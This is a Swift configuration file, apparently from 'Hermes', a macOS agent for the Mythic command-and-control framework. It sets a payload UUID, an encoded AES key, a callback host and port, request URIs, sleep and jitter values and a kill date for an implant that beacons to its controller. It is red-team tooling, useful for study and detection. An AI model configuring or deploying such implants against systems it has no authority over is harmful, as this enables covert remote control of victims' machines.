//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    var httpHeaders: Dictionary<String,String>
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "23128e17-9ae1-4807-ae87-579cfc6fbb00",
    encodedAESKey: "QjzB8Bg7yI+j1aLLtMJYQUzltpVPvAUQId8vw2T2o6g=",

    callbackHost: "192.168.196.129",
    getRequestURI: "/index",
    postRequestURI: "/data",
    callbackPort: 443,
    userAgent: "Hermes user agent",
    hostHeader: "",
    useSSL: true,
    queryParameter: "q",
    httpHeaders: ["key1":"value1","key2":"value2"],

    sleep: 5,
    jitter: 5,
    killDate: "2024-05-01"
)
